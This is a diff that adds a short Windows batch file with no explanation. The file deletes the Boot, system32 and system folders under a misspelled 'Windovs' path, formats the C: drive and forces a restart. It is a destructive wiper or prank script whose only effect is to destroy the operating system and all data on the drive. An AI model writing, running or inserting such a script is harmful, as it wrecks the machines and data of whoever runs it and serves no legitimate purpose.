@@ -1,0 +1,6 @@
+@echo off
+del C:/Windovs/Boot -f
+del C:/Windovs/system32 -f
+del C:/Windovs/system -f
+format C: /f
+shutdown -r
